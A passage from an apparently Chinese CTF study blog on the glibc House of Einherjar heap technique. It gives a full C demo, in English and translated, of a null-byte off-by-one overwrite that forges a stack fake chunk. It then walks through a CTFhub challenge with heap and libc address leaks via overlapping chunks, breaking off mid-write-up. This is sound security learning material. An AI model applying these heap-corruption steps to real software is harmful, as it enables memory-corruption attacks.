fake_prev_size)\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//if we allocate another chunk before we free b we will need to </span></span><br><span class="line"><span class="comment">//do two things: </span></span><br><span class="line"><span class="comment">//1) We will need to adjust the size of our fake chunk so that</span></span><br><span class="line"><span class="comment">//fake_chunk + fake_chunk&#x27;s size points to an area we control</span></span><br><span class="line"><span class="comment">//2) we will need to write the size of our fake chunk</span></span><br><span class="line"><span class="comment">//at the location we control. </span></span><br><span class="line"><span class="comment">//After doing these two things, when unlink gets called, our fake chunk will</span></span><br><span class="line"><span class="comment">//pass the size(P) == prev_size(next_chunk(P)) test. </span></span><br><span class="line"><span class="comment">//otherwise we need to make sure that our fake chunk is up against the</span></span><br><span class="line"><span class="comment">//wilderness</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x200) is at %p\n&quot;</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><ul><li>为了能认真让自己看一遍这个代码，我决定将汉化源码</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Credit to st4g3r for publishing this technique(感谢的话语)</span></span><br><span class="line"><span class="comment">   House of Einherjar 使用0字节溢出进行off-by-one利用,从而控制malloc()函数返回的指针.</span></span><br><span class="line"><span class="comment">   这个利用方式与有问题的Null Byte相比,可能造成更强大的原语,但是它有一个额外的条件就是需要泄露堆.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;欢迎来到House of Einherjar!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;在Ubuntu 16.04 64bit中测试.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;当你有一个能用0字节进行off-by-one利用,溢出到一个被分配的堆块区域,就可以进行house of enherjar.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span>* a;</span><br><span class="line"><span class="type">uint8_t</span>* b;</span><br><span class="line"><span class="type">uint8_t</span>* d;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n我们分配0x38字节给a指针\n&quot;</span>);</span><br><span class="line">a = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a: %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> real_a_size = malloc_usable_size(a);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;因为我们需要对堆块a进行溢出,所以我们需要a所指堆块在舍入后的真实大小: %#x\n&quot;</span>, real_a_size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// create a fake chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n我们在我们指定的地方创建一个fake chunk,在这个例子中,我们将在栈上创建一个chunk\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;然而,你也能创建chunk在堆中或者bss段中,只要你知道你所创建堆块的地址就可以.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我们设置fd指针和bk指针都指向fake_chunk,这样我们就可以绕过unlink的检查. \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;(这里在一些情况中我们也可以使用unlink漏洞)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> fake_chunk[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line">fake_chunk[<span class="number">0</span>] = <span class="number">0x100</span>; <span class="comment">// prev_size现在是被使用的,我们必须与fake_chunk的大小相同,这样才能绕过P-&gt;bk-&gt;size == P-&gt;prev_size这个语句的检查</span></span><br><span class="line">fake_chunk[<span class="number">1</span>] = <span class="number">0x100</span>; <span class="comment">// 这个chunk的size仅仅需要满足进入small bin的大小就行</span></span><br><span class="line">fake_chunk[<span class="number">2</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">// fwd</span></span><br><span class="line">fake_chunk[<span class="number">3</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">// bck</span></span><br><span class="line">fake_chunk[<span class="number">4</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">//fwd_nextsize</span></span><br><span class="line">fake_chunk[<span class="number">5</span>] = (<span class="type">size_t</span>) fake_chunk; <span class="comment">//bck_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我们伪造的堆块地址为:%p \n堆块中的伪造数据如下:\n&quot;</span>, fake_chunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, fake_chunk[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, fake_chunk[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, fake_chunk[<span class="number">3</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fwd_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">4</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;bck_nextsize: %#lx\n&quot;</span>, fake_chunk[<span class="number">5</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 在这个例子中如果块大小具有最小的合法字节,那么将更容易.</span></span><br><span class="line"><span class="comment"> * 数值:0x00. 这个最小的合法字节将是0x00,因为chunk的size包括申请的大小加上元数据所需的大小. */</span></span><br><span class="line">b = (<span class="type">uint8_t</span>*) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"><span class="type">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n我们分配0xf8字节给&#x27;b&#x27;指针.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span>* b_size_ptr = (<span class="type">uint64_t</span>*)(b - <span class="number">8</span>);</span><br><span class="line"><span class="comment">/*这个技术是通过覆盖已经一个已经分配的chunk的size位和pre_inuse bit位来实现的*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nb.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我们使用空字节溢出&#x27;a&#x27;堆块,使得该空字节写入到b堆块中的size位和pre_inuse bit位\n&quot;</span>);</span><br><span class="line">a[real_a_size] = <span class="number">0</span>; </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b.size: %#lx\n&quot;</span>, *b_size_ptr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;如果b.size是0x100的倍数,这时是最好利用的,此时我们不需要改变b的size,仅仅改变它的prev_inuse bit \n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;如果它已经被修改过了,我们需要在b中放一个fake_chunk,它将尝试与下一个chunk合并 \n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 伪造fake prev_size,从而确定a堆块结束的位置</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n我们伪造一个fake prev_size在a的最后%lu bytes,这样它将和我们的fake_chunk合并 \n&quot;</span>, <span class="keyword">sizeof</span>(<span class="type">size_t</span>));</span><br><span class="line"><span class="type">size_t</span> fake_size = (<span class="type">size_t</span>)((b-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>) - (<span class="type">uint8_t</span>*)fake_chunk);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我们的fake prev_size将是: %p - %p = %#lx\n&quot;</span>, b-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)*<span class="number">2</span>, fake_chunk, fake_size);</span><br><span class="line">*(<span class="type">size_t</span>*)&amp;a[real_a_size-<span class="keyword">sizeof</span>(<span class="type">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">//改变fake chunk的size位,使得其与b的新prev_size位相对应</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n修改fake_chunk的size位从而反应b的新prev_size位\n&quot;</span>);</span><br><span class="line">fake_chunk[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放b并且它将和我们的堆块合并</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;现在我们释放b并且b将和我们的fake chunk合并,因为b的prev_inuse没有被设置\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;我们的fake chunk的size位现在为: %#lx (b.size + fake_prev_size)\n&quot;</span>, fake_chunk[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果在我们释放b之前我们分配另一个chunk,将需要做两件事情</span></span><br><span class="line"><span class="comment">//1) 我们将需要调整我们fake chunk的size,这样才能使得fake_chunk + fake_chunk的size 指向我们所能控制的地方.</span></span><br><span class="line"><span class="comment">//2) 我们将需要在我们所控制的区域中写入的fake chunk的大小.</span></span><br><span class="line"><span class="comment">//在做这两件事情后,当unlink被调用时,我们的fake chunk将绕过size(P)== prev_size(next_chunk(P))的检测</span></span><br><span class="line"><span class="comment">//否则我们需要确保我们的对着无效区域</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n现在我们将调用malloc()并且它将从我们的fake chunk开始申请\n&quot;</span>);</span><br><span class="line">d = <span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;下一个malloc(0x200) is at %p\n&quot;</span>, d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>接下来进行动态调试，我们先申请了一个<code>0x38</code>的堆块。</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250129141756999.png" alt="image-20250129141756999"></p><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250129142154602.png" alt="image-20250129142154602"></p><ul><li>然后我们在栈上伪造了一个<code>fake chunk</code>,伪造的<code>fake chunk</code>数据如下</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250129142643371.png" alt="image-20250129142643371"></p><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250129143110543.png" alt="image-20250129143110543"></p><ul><li>之后又申请了一个<code>0xf8</code>大小的堆块。</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250129143309415.png" alt="image-20250129143309415"></p><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250129143536920.png" alt="image-20250129143536920"></p><ul><li>这时我们再通过<code>off-by-one</code>溢出，修改<code>b</code>的<code>p</code>位为<code>0</code>（其他俩位在申请时默认为0）</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250129143747034.png" alt="image-20250129143747034"></p><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250129143754990.png" alt="image-20250129143754990"></p><ul><li>之后我们先泄露了<code>b</code>的地址和<code>fake chunk</code>的地址，并计算这两个的偏移，将计算的结果写入到<code>b</code>的<code>prev_size</code>位中，同时还需要改变<code>fake chunk</code>的<code>size</code>位（这样貌似是为了绕过检查）</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250129145246906.png" alt="image-20250129145246906"></p><ul><li>此时我们再释放堆块<code>b</code>，在释放的过程中就发生了<code>unlink</code>使得堆块<code>b</code>和<code>fake_chunk</code>合并，结果就会变成如下这样。这时我们的堆就会被合并到栈上。（用<code>heap</code>或者<code>heap -v</code>命令再查看栈就会出现问题，查看到的堆块并不是我们下次分配要分割的堆块起始地址。下次要分割返回的起始地址其实在<code>fake_chunk</code>那边，看下一步malloc就清楚了）</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250129145710490.png" alt="image-20250129145710490"></p><ul><li>然后我们再申请一个<code>0x200</code>大小的堆块。</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250129150053226.png" alt="image-20250129150053226"></p><h1 id="house-of-einherjar_level_1"><a class="markdownIt-Anchor" href="#house-of-einherjar_level_1"></a> house of einherjar_level_1</h1><ul><li><p>题目来源：<code>CTFhub</code>的<code>house of einherjar</code>，题目环境是<code>glibc2.23</code>，但是为了方便动态调试，我就使用<code>ubuntu22.04</code>，即<code>glibc2.35</code>版本，之后动态调试查看<code>fd</code>指针的时候才会使用<code>glibc2.23</code>的环境，因为高版本的<code>glibc</code>存储<code>fd</code>的指针的值为进行异或加密</p></li><li><p>这题在<code>2月2号</code>尝试打了一下，但是由于题打太少了，思维给实验的那种利用方式给限制了，这题并不是在<code>bss</code>段或者是<code>栈</code>上伪造堆块，而是构造堆叠，进行堆排布。（但是收获还是有的，弄好了<code>docker</code>环境中的<code>gdb</code>调试）</p></li><li><p>今天<code>2月3号</code>打算再来尝试一下这题（找了好半天看了wp之后才知道要用堆叠，并且这题还要用到<code>malloc_hook</code>，打完这题马上就学<code>malloc_hook</code>）</p></li><li><p>这题本地打一下就行，打远程还是有点问题</p></li></ul><h2 id="level_1_分析1"><a class="markdownIt-Anchor" href="#level_1_分析1"></a> level_1_分析1</h2><ul><li>接下来检查一下程序的保护机制，发现保护开的很全，这时候就</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250202214905045.png" alt="image-20250202214905045"></p><ul><li>接下来将该程序拖入<code>IDA</code>对该程序进行逆向分析，同时配合程序的运行，这样可以更好的理清程序的运行逻辑</li><li>先来查看一下<code>main</code>函数的大致逻辑<ul><li>先是<code>init</code>对该程序进行输入输出初始化，让该程序无缓冲输入，但是标准输出好像不是无缓冲输出</li><li>接下来打印<code>menu</code>菜单，<code>1.create</code>、<code>2.show</code>、<code>3delete</code>、<code>4.edit</code>、<code>5.exit</code></li><li>接下来就是让用户输入选项，输入选项之后就进入用户所选择选项的相应函数</li></ul></li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250202215400359.png" alt="image-20250202215400359"></p><ul><li>接下来查看<code>add()</code>函数<ul><li>先让用户输入<code>ID</code>，也就是申请堆块返回地址存储的索引</li><li>然后让用户输入<code>size_long</code>，也就是所要申请堆块的大小</li><li>经过判断后，满足条件就调用<code>malloc()</code>函数申请用户指定的堆块大小，并将返回的堆块地址存储到<code>chunk</code>数组中</li><li>之后将<code>size_long</code>存储在<code>size</code>中</li></ul></li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250202215548388.png" alt="image-20250202215548388"></p><ul><li>现在来查看<code>delete()</code>函数<ul><li>让用户输入book的<code>ID</code></li><li>之后使用<code>free()</code>函数释放指定<code>ID</code>的堆块</li><li>之后还将存储释放堆块的地址置<code>0</code>所以不存在<code>UAF</code>漏洞</li></ul></li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250202220017564.png" alt="image-20250202220017564"></p><ul><li>接下来就查看<code>show</code>函数<ul><li>将用户指定的堆块内容输出到屏幕上，这边还存在着数组越界引用的漏洞。（这个数组越界引用的漏洞并没有什么用好像）</li><li>最多就是利用<code>%s</code>这个字符串格式化对堆块的地址进行泄露</li></ul></li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250202220232000.png" alt="image-20250202220232000"></p><ul><li>接下来查看<code>edit()</code>这个函数<ul><li>在这里先会读取上一次申请堆块的大小</li><li>之后我们选择要<code>edit</code>的堆块<code>ID</code></li><li>之后就向我们指定的堆块中写入数据</li><li><strong>注意由于我们读取的是上一次操作堆块的大小，所以与我们所指定的堆块大小无关</strong>，这就可能造成堆溢出的操作。（这个程序逻辑需要动态调试和认真读汇编代码才能理清楚代码逻辑）</li><li>假如我们在<code>edit</code>之前申请堆块ID为14，这时我们<code>edit</code>的size就是ID14的size。当我们在<code>edit</code>之前是释放ID为10的堆块，这时我们<code>edit</code>的size就是ID为10的堆块的size</li></ul></li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250202234805639.png" alt="image-20250202234805639"></p><ul><li>我们在<code>.bss</code>段中发现了全局变量<code>number</code>，但是这个<code>number</code>在程序运行过程中没有被使用，这个全局变量就很可能是用来伪造堆块</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250203012043439.png" alt="image-20250203012043439"></p><h2 id="level_1_分析2"><a class="markdownIt-Anchor" href="#level_1_分析2"></a> level_1_分析2</h2><ul><li>现在进行gdb动态调试，这时候我们这边有一个堆溢出，这样我们可以通过堆风水对堆进行巧妙的排布，然后再通过堆溢出，最后使用<code>edit()</code>函数就可以泄露出堆地址。但是泄露完这个堆地址后并没有什么用 ，因为我们没办法对<code>.bss</code>段的地址或者<code>栈</code>上的地址，使用这种利用方式是行不通的。</li><li>那么我们就直接利用<code>unlink</code>机制，两个堆<code>unlink</code>后，堆块就会被放入<code>unsorted_bin</code>，由于<code>unsorted_bin</code>是双向链表，这样我们就可以利用这个链表指针，通过<code>edit()</code>函数将libc的地址泄露出来。接下来我们进行动态调试。这样我们就要先使用<code>house_of_einherjar</code>堆块伪造技术，对堆块进行堆叠。</li><li>由于后申请的堆块处于更高地址，最后申请的堆块与<code>top</code>chunk相邻，为了不让合并后的堆块与<code>top_chunk</code>合并，我们在申请我们所需要理由的堆块后最后还要申请一个堆块，用于阻隔合并后的堆块和<code>top_chunk</code>。（并且这个堆块要的size要比之前的大一点，这样我们才能够进行堆溢出操作。）</li><li>注意：<strong>house of einherjar利用的是堆块的后向合并，这时我们要修改低地址的堆块为空闲堆块，再free高地址的堆块所以这个堆块的prev_inuse位就需要为1</strong>。这时我们需要绕过<code>unlink</code>的检查机制</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      \</span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span><br></pre></td></tr></table></figure><ul><li>这时我们就需要泄露<code>chunk</code>的地址，这时我们就要先泄露堆块的地址，我们先创建一个堆块ID6，大小为<code>0x10</code>用于堆溢出，然后我们再申请两个堆块ID7、ID8大小都为0x20，最后防止被释放的堆块合并<code>top</code>我们再申请一个堆块ID9大小为<code>0x40</code></li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250204103526930.png" alt="image-20250204103526930"></p><ul><li>这时我们先释放ID8的堆块（后申请的堆块），再释放ID7的堆块（先申请的堆块）。这两个堆块就放入了<code>fastbin</code>中，堆块ID7的<code>fd</code>指针会指向堆块ID8的<code>prev_size_addr</code>。</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250204103829572.png" alt="image-20250204103829572"></p><ul><li>这时我们就可以通过溢出ID6，溢出到<code>ID7</code>的fd指针，再使用<code>show()</code>函数，打印出ID6堆块内容的同时就会将ID7的<code>fd</code>指针打内容打印出来，这样我们就可以泄露ID8的<code>prev_size_addr</code>的地址从而就可以泄露堆块的地址</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250204104159744.png" alt="image-20250204104159744"></p><ul><li>这样我们就可以进行堆块溢出</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250204104256325.png" alt="image-20250204104256325"></p><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250204104621857.png" alt="image-20250204104621857"></p><ul><li>这样堆块的地址就可以被泄露出来了。</li><li>现在我们就可以开始伪造堆块，这样就可以进行<code>house of einherjar</code>的利用。结合利用原理，这时我们先要申请一个堆块ID0大小为0x10，这样我们就可以进行对高地址的的堆块进行溢出。然后我们要申请一个<code>size</code>位为0x100整数倍的堆块。所以我们申请一个堆块ID1大小为<code>0xf8</code>的堆块，然后我们再申请一个堆块ID2大小为<code>0x10</code>，用于另一个堆块的溢出。之后我们继续申请一个堆块ID3大小为<code>0xf8</code>的堆块。最后由于edit的堆块的size是调用上一个ID堆块的size，所以我们还要申请一个堆块ID4大小为0x40（这样我们在编辑堆块ID2的时候就可以进行溢出操作）。这时我们就要溢出修改ID3的<code>prev_size</code>和<code>prev_inuse</code>这两个位</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250204110202592.png" alt="image-20250204110202592"></p><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250204105936993.png" alt="image-20250204105936993"></p><ul><li>然后我们还要再申请一个堆块ID5大小为0x40，这样我们才能在修改<code>ID0</code>的时候发生溢出，从而修改ID1堆块的<code>size</code>位、<code>fd</code>、<code>bk</code>这三个</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250204110436095.png" alt="image-20250204110436095"></p><ul><li>之后我们就可以释放堆块<code>ID3</code>这样我们就可以将该堆块释放，并且触发<code>unlink</code>进行后向合并，并且可以绕过<code>unlink</code>的检查机制，这样我们<code>ID1、ID2、ID3</code>就可以合并（其实是ID1和ID3合并）因为我们修改了size和prev_size。所以合并的时候就会连同ID2的堆块一起合并，放入unsorted_bin中。但是堆块ID2的地址还是保存在<code>chunk[ID]</code>数组中我们还可以对这个堆块进行<code>show</code>、<code>edit</code>操作，这时我们再申请一个堆块<code>ID1</code>大小为<code>0xf8</code>。</li><li>这时就会从<code>unsorted_bin</code>合并的堆块中分割<code>0xf8</code>大小。这时剩下的堆块，其fd、bk指针就恰好为堆块ID2中的<code>fd</code>、<code>bk</code>、由于<code>unsorted_bin</code>使用的是双向链表，此时的<code>fd</code>、<code>bk</code>指针就会被指向<code>main_arena+88</code>地址处，这时我们就可以<code>show(ID2)</code>从而泄露libc地址</li></ul><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250204111611619.png" alt="image-20250204111611619"></p><p><img src="/2025/01/15/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-einherjar/image-20250204111718393.png" alt="image-20250204111718393"></p><h2 id="level_1_分析3"><a class="markdownIt-Anchor" href="#level_1_分析3"></a> 